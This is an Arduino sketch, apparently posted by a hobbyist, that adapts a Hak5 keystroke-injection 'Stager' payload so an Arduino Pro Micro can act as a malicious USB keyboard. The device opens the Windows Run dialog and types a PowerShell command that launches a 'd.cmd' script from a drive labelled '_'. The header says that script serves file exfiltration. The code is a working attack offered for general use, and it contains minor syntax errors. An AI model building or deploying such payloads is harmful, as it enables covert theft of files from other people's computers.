#include Keyboard.h

/*
 * This is a modified version of the Stager payload for file exfiltration by Hak5. This verison has been modified to run on an arduino pro micro instead of a USB rubber ducky, which makes it more accessible to the general population. 
 * The actual process behind the code here was Hak5's design, and not mine. I just converted it over to arduino. 
 * 
 * PwnKitteh, 2018
 */


void setup() {
  // put your setup code here, to run once:
  pinMode(3, INPUT_PULLUP);     //If switch is pushed, enter programming mode (AKA infinite while loop)
  if (digitalRead(3) == LOW) {
  while(1);
  }

  delay(1000);
  Keyboard.begin();
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(200)

  Keyboard.print("powershell \".((gwmi win32_volume -f \'label=\'\'_\'\'\').Name+\'d.cmd')\"");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
}

void loop() {
  // put your main code here, to run repeatedly:

}
